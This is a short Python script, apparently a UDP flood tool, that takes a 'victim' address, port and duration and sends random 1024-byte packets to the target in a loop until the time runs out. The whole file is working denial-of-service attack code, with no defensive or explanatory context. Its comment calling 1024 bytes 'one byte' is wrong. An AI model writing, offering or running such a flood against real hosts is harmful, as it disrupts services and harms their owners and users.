# To change this license header, choose License Headers in Project Properties.
# To change this template file, choose Tools | Templates
# and open the template in the editor.

import socket
import random
import time
import sys

if __name__ == "__main__":
    victim  = sys.argv[1]
    vport = int(sys.argv[2])
    duration  = int(sys.argv[3])

    timeout =  time.clock() + duration
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    msg = random._urandom(1024) # 1024 representes one byte to the server

    while (timeout > time.clock()):
        client.sendto(msg, (victim, vport))
